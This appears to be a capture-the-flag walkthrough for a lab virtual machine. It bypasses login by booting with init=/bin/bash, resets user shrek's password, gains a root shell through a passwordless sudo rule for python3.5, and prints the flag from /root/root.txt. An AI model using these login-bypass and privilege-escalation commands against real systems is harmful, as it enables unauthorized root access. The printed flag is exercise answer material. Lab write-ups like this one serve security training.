

1. Log in and Obtain the IP Address

Start the virtual machine and when you get to GNU GRUB menu press e to edit the boot parameters.

Scrolling a bit down you should see a line that starts with linux /boot/vmlinuz-4.4.0-194 etc, at the end of the line write 
    init=/bin/bash 

Username can be found with this command
    cat /etc/passwd
Username is shrek

Password can be changed with this command
    passwd shrek

I got IP address using this command

    ifconfig

The address is this 

    10.0.2.15

2. Escalate Privileges

Escalate Privileges
Make a script named exploit.py

    nano exploit.py

In exploit.py type

    import subprocess

    subprocess.call(["/bin/bash", "-c", "whoami && id"])

Then make script executable using the chmod command

    chmod +x exploit.py

And since user shrek is allowed to run /usr/bin/python3.5 as root without a password prompt, you can execute the Python script using sudo

    sudo /usr/bin/python3.5 exploit.py

Use this command to elevate users privileges

    sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'

Verify root access:

        whoami

3. Find the Flag

Search for the Flag File

By looking around root.txt can be found 

Read the Flag File

    cat /root/root.txt

Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
